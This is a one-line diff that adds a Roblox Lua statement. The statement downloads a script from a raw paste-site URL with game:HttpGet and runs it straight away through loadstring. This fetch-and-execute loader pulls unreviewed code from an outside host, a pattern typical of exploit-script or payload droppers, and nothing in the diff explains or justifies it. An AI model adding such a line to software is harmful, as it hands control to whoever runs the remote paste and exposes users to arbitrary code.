@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pastesio.com/raw/1234567891011121314151617181920"))();
